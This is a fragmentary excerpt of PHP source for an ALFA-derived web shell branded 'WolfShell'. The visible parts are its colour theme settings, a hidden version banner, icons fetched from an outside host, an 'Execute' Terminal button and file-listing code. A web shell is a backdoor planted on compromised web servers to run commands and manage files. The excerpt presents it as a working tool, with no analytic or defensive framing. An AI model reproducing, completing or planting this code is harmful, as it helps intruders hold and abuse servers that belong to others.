...
define("__ALFA_CODE_NAME__", "WolfShell");
...
$GLOBALS['__ALFA_COLOR__'] = array(
		...
		"input_box_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				"input[type=text],textarea" => "border: 1px solid #00a5ab",
			)
		),
		"input_box_text" => array(
			"key_color" => "#999999",
			"multi_selector" => array(
				"input[type=text],textarea" => "color: #cacf00;",
			)
		),
		...
		"uploader_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".inputfile" => "box-shadow:0 0 4px #00a5ab;border:1px solid #00a5ab;",
			)
		),
		"uploader_background" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".inputfile strong" => "background-color: #00a5ab;",
			)
		),
		"uploader_text_right" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".inputfile strong" => "color:#ffffff;",
			)
		),
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#f9ff00;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
...
function __showicon($r){
	$s['btn']='https://aku.barujadi.pro/img/btn.png';
	$s['alfamini']='https://aku.barujadi.pro/img/bajaklaut.png';
	$s['loader']='https://aku.barujadi.pro/img/loading.png';
...
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='https://aku.barujadi.pro/img/terminal.png'> Terminal</button><br></form></td>
</tr>
<tr>
...
if($type!='file'){
return ($file=='..'?$s.'back.png':'https://aku.barujadi.pro/img/dir.png');
}else{
$ext = explode('.',$file);
$ext = end($ext);
$ext = strtolower($ext);
